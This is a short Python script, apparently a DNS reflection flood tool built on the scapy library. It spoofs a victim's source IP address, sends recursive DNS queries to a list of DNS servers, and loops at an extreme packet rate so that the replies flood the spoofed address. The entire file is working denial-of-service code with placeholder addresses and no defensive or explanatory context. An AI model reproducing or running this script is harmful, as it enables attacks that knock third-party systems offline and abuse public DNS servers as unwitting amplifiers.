from scapy.all import *


src_ip = 'A.B.C.D'
src_port = RandShort()
dns_servers = ["E.F.G.H", "I.J.K.L"]
dst_port = 53
ip = IP(src=src_ip, dst=dns_servers)
udp = UDP(sport=src_port, dport=dst_port)
dns = DNS(rd=1,qd=DNSQR(qname="example.com",qtype="A"))
pkt = Ether() / ip / udp / dns
sendpfast(pkt, pps=999999999999999, loop=999999999999999)
